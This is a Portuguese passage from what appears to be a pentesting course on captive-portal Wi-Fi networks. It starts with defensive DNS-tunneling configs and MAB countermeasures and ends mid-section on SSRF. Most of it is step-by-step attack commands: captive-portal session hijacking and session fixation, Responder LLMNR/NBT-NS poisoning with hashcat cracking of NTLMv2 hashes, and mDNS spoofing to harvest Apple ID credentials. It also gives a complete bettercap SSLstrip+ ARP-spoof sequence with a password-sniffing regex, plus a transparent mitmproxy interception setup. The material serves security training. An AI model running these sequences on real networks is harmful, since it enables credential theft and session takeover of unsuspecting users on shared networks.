# Só responder queries de clientes locais bind-interfaces interface=wlan0 listen-address=192.168.1.1 # Rate limiting: máximo 10 queries por segundo por IP # (iodine precisa de muito mais que isso) dns-rr=10 # Bloquear tipos de registro usados por tunneling # (filtrar TXT antes da autenticação) # Isso requer integração com dnsdist para filtragem por tipo # Resolver apenas via DNS interno (não repassar ao externo # antes da autenticação — configurar via iptables) no-resolv server=8.8.8.8 # só usado APÓS autenticação via iptables mark

iptables — forçar DNS interno e bloquear externo

Regras para restringir DNS antes da autenticação
# Redirecionar TODO DNS de clientes não autenticados para o DNS interno iptables -t nat -A PREROUTING \ -i wlan0 -p udp --dport 53 \ -j DNAT --to-destination 192.168.1.1:53 # Bloquear DNS direto para servidores externos (evita bypass do redirect) iptables -A FORWARD \ -i wlan0 -p udp --dport 53 \ ! -d 192.168.1.1 -j DROP # Rate limiting de queries DNS por IP (máx 20/s) iptables -A INPUT -p udp --dport 53 \ -m hashlimit \ --hashlimit-name dns_rl \ --hashlimit-above 20/sec \ --hashlimit-mode srcip \ -j DROP

dnsdist — filtrar tipos de registro suspeitos

/etc/dnsdist/dnsdist.conf
# dnsdist como proxy DNS com filtragem newServer({address="8.8.8.8", name="google"}) -- Bloquear registros TXT (usados pelo iodine) antes da autenticação addAction(QTypeRule(DNSQType.TXT), DropAction()) addAction(QTypeRule(DNSQType.NULL), DropAction()) -- Bloquear queries com subdomain muito longo (tunneling) addAction( AndRule({ NotRule(QTypeRule(DNSQType.A)), RegexRule("[a-zA-Z0-9]{30,}\\.") -- label > 30 chars = suspeito }), DropAction() )

Resumo das contramedidas MAB

  • DHCP fingerprinting — impressoras HP solicitam DHCP com opções específicas (Option 60 = "HP LaserJet"). Um laptop não replica isso automaticamente.
  • Port binding — vincular o MAC isento à porta física do switch. Se aparecer em outra porta: alerta.
  • Device profiling comportamental — monitorar se o "dispositivo" começa a fazer DNS lookups de domínios suspeitos, abrir conexões SSH ou gerar tráfego HTTP incomum.
  • RADIUS com atributos extras — além do MAC, verificar NAS-Port-Id (porta do switch) e Calling-Station-Id.

Indirect Exploitation · Módulo 6b
External HTTP Session Interception
Diferente de capturar credenciais — aqui capturamos e reutilizamos sessões já autenticadas sem precisar da senha.
WiresharkBettercapcurlCookie EditorBurp Suite

A distinção entre credential interception e session interception é sutil mas importante. Na interceptação de credenciais, capturamos o username/password durante o POST de login. Na interceptação de sessão, capturamos o cookie de sessão de um usuário já autenticado — sem precisar das credenciais. Com o cookie, assumimos a sessão ativa diretamente.

ℹ️ Muitos portais mantêm a sessão ativa via cookie HTTP (sem HTTPS). Qualquer tráfego subsequente desse usuário carrega o cookie — não só o POST de login. Basta capturar um único request autenticado para ter acesso.

Como sessões funcionam em captive portals

Fluxo de sessão típico de um portal HTTP
# 1. Usuário faz login — portal define cookie POST /login HTTP/1.1 username=joao&password=senha123 HTTP/1.1 302 Found Set-Cookie: portal_session=a3f8d2c9e1b7; Path=/; HttpOnly Location: /success # 2. Requests subsequentes carregam o cookie GET /internet-access HTTP/1.1 Cookie: portal_session=a3f8d2c9e1b7 ← isso é tudo que precisamos # 3. O portal valida o cookie e libera tráfego # Não verifica IP, não verifica MAC novamente — só o cookie

Variação: Session Fixation

Alguns portais vulneráveis aceitam um cookie de sessão antes do login e mantêm o mesmo ID após a autenticação. Isso permite um ataque de fixação: o atacante define um cookie falso no browser da vítima (via XSS ou link), aguarda ela fazer login, e então usa o mesmo cookie fixado para acessar a sessão autenticada.

Detectar session fixation — verificar se o cookie muda após login
# Antes do login: anotar o Set-Cookie da primeira visita ao portal curl -c cookies_antes.txt http://192.168.1.1/login cat cookies_antes.txt # ex: portal_session=PRE_AUTH_TOKEN # Após login com credenciais válidas: curl -b cookies_antes.txt -c cookies_depois.txt \ -X POST http://192.168.1.1/login \ -d "username=admin&password=admin123" cat cookies_depois.txt # Se portal_session NÃO MUDOU após o login: # → vulnerável a session fixation # O token pré-autenticado agora tem privilégios de sessão autenticada
🚨 Session interception é imperceptível para a vítima — a sessão dela continua funcionando normalmente enquanto o atacante usa o mesmo token em paralelo. Portais sem HTTPS são intrinsecamente vulneráveis a este ataque.

Este vetor é diferente de todos os outros: o alvo não é o portal, mas os outros clientes da rede. Numa rede de hotel ou conferência, centenas de dispositivos estão na mesma sub-rede. Muitos rodam serviços vulneráveis ou respondem a protocolos de descoberta que podem ser envenenados.

LLMNR e NBT-NS Poisoning com Responder

Windows usa LLMNR (Link-Local Multicast Name Resolution) e NBT-NS (NetBIOS Name Service) para resolver nomes de host quando o DNS falha. Na mesma sub-rede, qualquer dispositivo pode responder a essas queries — inclusive o atacante.

Capturar hashes NTLMv2 com Responder
# Instalar Responder sudo apt install responder # Iniciar Responder na interface da rede do portal # Responde a LLMNR, NBT-NS e mDNS com o IP do atacante sudo responder -I wlan0 -rdw # Quando uma máquina Windows tenta acessar \\servidor\share # e o DNS não resolve, ela tenta LLMNR/NBT-NS # Responder responde: "sou eu!" → Windows envia credencial NTLMv2 # Hashes capturados ficam em: cat /usr/share/responder/logs/NTLMv2-*.txt # [SMB] NTLMv2 Hash : joao::EMPRESA:abc123:hash_ntlmv2_completo # Quebrar o hash com hashcat hashcat -m 5600 hash_ntlmv2.txt /usr/share/wordlists/rockyou.txt

mDNS Poisoning

Dispositivos Apple e Linux usam mDNS (Multicast DNS, porta UDP 5353) para descoberta de serviços na rede local — impressoras AirPrint, Bonjour, Chromecast, etc. Um atacante pode responder a queries mDNS com dados falsos.

Envenenar mDNS com Responder (já incluso) ou bettercap
# Responder já poisona mDNS automaticamente (-d flag) sudo responder -I wlan0 -d # Com bettercap — módulo mdns.spoof sudo bettercap -iface wlan0 -eval " mdns.spoof on; set mdns.spoof.domains _ipp._tcp.local,_http._tcp.local " # Resultado: dispositivos Apple tentando encontrar impressoras # são redirecionados para o atacante # Combinar com hostile portal para capturar credenciais iCloud/Apple ID

Hijacking Clients · Módulo 7c
Client Hijacking via Interception (HTTPS Downgrade)
Interceptação ativa com foco em downgrade de HTTPS e captura de credenciais protegidas por TLS.

O módulo de ARP spoofing do curso cobre a posição MitM básica. O HTB expande isso com foco específico em downgrade de HTTPS — a técnica de forçar um cliente a usar HTTP mesmo em sites que suportam HTTPS, expondo o tráfego criptografado.

Por que HTTPS dificulta a interceptação

O problema do TLS para o atacante MitM
# Sem downgrade: cliente faz HTTPS direto # Atacante vê apenas: IP:443, SNI hostname, tamanho dos pacotes # Conteúdo ilegível → TLS criptografado # Com downgrade (SSLstrip): cliente é forçado a HTTP # Atacante vê: URL completa, headers, body, cookies # Conteúdo legível → bypass do TLS

SSLstrip+ com dns2proxy (bypass de HSTS parcial)

O SSLstrip clássico falha em sites com HSTS (HTTP Strict Transport Security) porque o browser recusa conexões HTTP nesses domínios. O SSLstrip+ usa um truque: substituir o domínio por um subdomínio falso (ex: www.banco.com vira wwww.banco.com) que não tem HSTS configurado.

Ataque SSLstrip+ completo com bettercap
# Bettercap tem SSLstrip+ integrado sudo bettercap -iface wlan0 # No console bettercap: net.probe on set arp.spoof.targets 192.168.1.0/24 arp.spoof on # Ativar HTTPS downgrade set https.proxy.sslstrip true https.proxy on http.proxy on # Ativar captura de credenciais set net.sniff.regexp .*password=.*|.*passwd=.*|.*pass=.* net.sniff on # Monitorar output — credenciais aparecem em tempo real

mitmproxy — interceptação cirúrgica de HTTPS

mitmproxy com certificado dinâmico
# mitmproxy gera certificados falsos dinamicamente para cada domínio # O browser mostrará aviso de certificado — mas muitos usuários ignoram # Redirecionar HTTPS para mitmproxy sudo iptables -t nat -A PREROUTING \ -i wlan0 -p tcp --dport 443 \ -j REDIRECT --to-port 8080 # Iniciar mitmproxy mitmproxy --mode transparent --showhost # Ou em modo headless com log automático mitmdump --mode transparent \ -w /tmp/https_capture.mitm # Ler captura depois mitmproxy -r /tmp/https_capture.mitm

Bypass de HSTS via preload list

Sites críticos (bancos, Google, etc.) estão na HSTS preload list — o browser recusa HTTP mesmo na primeira visita, sem precisar de header. Contra esses sites, SSLstrip não funciona. A alternativa é:

  • DNS spoofing para IP do atacante — o browser tenta HTTPS, mas o certificado é falso → aviso visível
  • Capturar tráfego de apps móveis — muitos apps não implementam certificate pinning e aceitam o cert falso do mitmproxy
  • Focar em domínios sem HSTS — portais internos, ferramentas corporativas, e muitos sites de médio porte não têm HSTS
Verificar se um domínio está na HSTS preload list
# Verificar online curl https://hstspreload.org/api/v2/status?domain=exemplo.com # Verificar header HSTS no site curl -sI https://exemplo.com | grep -i strict # Strict-Transport-Security: max-age=31536000; includeSubDomains; preload # Se tiver "preload": SSLstrip não funciona neste domínio

Esta é a técnica mais específica do HTB: usar uma vulnerabilidade do portal para adicionar seu próprio MAC/IP à whitelist sem precisar autenticar. Existem várias formas dependendo da vulnerabilidade encontrada.

Via SSRF no portal
